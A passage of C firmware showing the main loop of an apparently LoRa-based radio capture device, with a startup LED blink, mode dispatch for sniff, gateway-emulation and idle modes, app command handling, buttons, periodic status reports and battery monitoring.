    for (int i = 0; i < 3; i++) {
        LED_ON(LED_RF_PORT, LED_RF_PIN);
        LED_ON(LED_BLE_PORT, LED_BLE_PIN);
        LED_ON(LED_USB_PORT, LED_USB_PIN);
        delay_ms(50);
        LED_OFF(LED_RF_PORT, LED_RF_PIN);
        LED_OFF(LED_BLE_PORT, LED_BLE_PIN);
        LED_OFF(LED_USB_PORT, LED_USB_PIN);
        delay_ms(50);
    }

    /* ---- Main super-loop ---- */
    uint32_t last_status_ms = 0;
    uint32_t last_bat_ms = 0;

    while (1) {
        g_state.uptime_ms = millis();

        /* ---- Service the current mode ---- */
        switch (g_state.mode) {
        case MODE_SNIFF:
            mode_sniff();
            break;
        case MODE_GATEWAY_EMU:
            mode_gateway_emu();
            break;
        case MODE_IDLE:
        default:
            /* Idle: radio sleeping, low-power */
            if (!g_state.sniff_active && !g_state.gwemu_active) {
                sx1262_sleep();
            }
            break;
        }

        /* ---- Check for commands from app ---- */
        uint8_t cmd = 0;
        uint8_t payload[PROTO_MAX_PAYLOAD];
        uint16_t plen = 0;
        if (transport_recv(&cmd, payload, &plen, 10) == 0) {
            handle_command(cmd, payload, plen);
        }

        /* ---- Buttons ---- */
        if (button_pressed(BTN_CAPTURE_PORT, BTN_CAPTURE_PIN)) {
            /* Capture button: toggle sniff mode */
            if (g_state.mode == MODE_SNIFF && g_state.sniff_active) {
                g_state.sniff_active = 0;
                sx1262_sleep();
                sdcard_close();
            } else {
                g_state.mode = MODE_SNIFF;
                mode_sniff();
            }
        }
        if (button_pressed(BTN_MODE_PORT, BTN_MODE_PIN)) {
            cycle_mode();
        }

        /* ---- Periodic status + battery ---- */
        if ((millis() - last_status_ms) > 2000) {
            last_status_ms = millis();
            send_status();
        }
        if ((millis() - last_bat_ms) > 10000) {
            last_bat_ms = millis();
            g_state.bat_mv = battery_read_mv();
            if (g_state.bat_mv < BAT_EMPTY_MV) {
                LED_ON(LED_ERR_PORT, LED_ERR_PIN);
            }
        }

        /* ---- BLE heartbeat LED ---- */
        static uint32_t last_ble_led = 0;
        if ((millis() - last_ble_led) > 1000) {
            last_ble_led = millis();
            LED_TOGGLE(LED_BLE_PORT, LED_BLE_PIN);
        }
        /* ---- USB LED ---- */
        if (usb_cdc_connected()) LED_ON(LED_USB_PORT, LED_USB_PIN);
        else                     LED_OFF(LED_USB_PORT, LED_USB_PIN);
    }

    return 0;  /* unreachable */
}